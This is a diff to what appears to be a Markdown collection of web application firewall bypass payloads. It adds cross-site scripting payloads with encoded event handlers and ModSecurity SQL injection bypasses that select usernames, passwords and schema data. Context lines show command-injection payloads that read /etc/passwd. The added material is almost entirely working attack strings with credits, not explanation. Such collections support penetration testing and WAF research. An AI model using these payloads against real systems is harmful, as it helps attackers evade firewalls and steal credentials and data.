@@ -2875,6 +2875,11 @@ http://<domain>/path?var1=vardata1&var2=vardata2&pad=<large arbitrary data>
 <body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
 <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
 ```
+- XSS Bypass by [@Aatif Khan](https://twitter.com/thenapsterkhan)
+```
+<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
+<div contextmenu="xss">Right-Click Here<menu id="xss"onshow="prom%25%32%33%25%32%36x70;t(1)“>
+```
 - [`report_type` XSS](https://www.securityfocus.com/bid/27462/info) by [@NNPoster](https://www.exploit-db.com/?author=6654)
 ```
 https://host/dms/policy/rep_request.php?report_type=%22%3E%3Cbody+onload=alert(%26quot%3BXSS%26quot%3B)%3E%3Cfoo+
@@ -2918,7 +2923,7 @@ state=%2527+and+
 BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+ 
 ```
 
-### ModSecurity CRS
+### ModSecurity
 - [RCE Payloads Detection Bypass for PL3](https://www.secjuice.com/web-application-firewall-waf-evasion/) by [@theMiddle](https://twitter.com/Menin_TheMiddle) (v3.1)
 ```
 ;+$u+cat+/etc$u/passwd$u
@@ -2934,6 +2939,38 @@ BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+
 - [RCE Payloads for PL3](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) by [@theMiddle](https://twitter.com/Menin_TheMiddle) (v3.0)
 ```
 /?in/cat+/et?/passw?
+```
+- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Johannes Dahse](https://twitter.com/#!/fluxreiners) (v2.2)
+```
+0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
+```
+- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Yuri Goltsev](https://twitter.com/#!/ygoltsev) (v2.2)
+```
+1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')
+```
+- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Ahmad Maulana](http://twitter.com/#!/hmadrwx) (v2.2)
+```
+1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-
+```
+- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Travis Lee](http://twitter.com/#!/eelsivart) (v2.2)
+```
+amUserId=1 union select username,password,3,4 from users
+```
+- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Roberto Salgado](http://twitter.com/#!/lightos) (v2.2)
+```
+%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201
+```
+- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Georgi Geshev](http://twitter.com/#!/ggeshev) (v2.2)
+```
+1%0bAND(SELECT%0b1%20FROM%20mysql.x)
+```
+- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@SQLMap Devs](http://sqlmap.sourceforge.net/#developers) (v2.2)
+```
+%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29
+```
+- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@HackPlayers](http://twitter.com/#!/hackplayers) (v2.2)
+```
+%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201
 ```
 
 ### Imperva
@@ -3051,6 +3088,11 @@ c\\a\\t+/et\\c/pas\\swd
 ```
 0 union(select 1,username,password from(users))
 0 union(select 1,@@hostname,@@datadir)
+```
+- XSS Bypass by [@Aatif Khan](https://twitter.com/thenapsterkhan) (v4.1)
+```
+<details ontoggle=alert(1)>
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
 ```
 
 ### Wordfence
